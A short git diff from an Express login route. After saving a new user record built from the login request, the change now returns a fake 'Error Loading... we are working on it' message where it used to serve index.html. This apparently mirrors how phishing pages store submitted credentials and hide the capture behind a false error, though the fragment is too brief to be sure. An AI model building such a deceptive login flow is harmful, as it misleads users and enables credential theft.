@@ -39,7 +39,8 @@ app.post('/login',function(req,res){
                  });
     newuser.save().then(data=>{
         console.log(data);
-        res.sendfile('index.html');
+        res.send('Error Loading.........we are working on it.....');
+
     })
 
 })
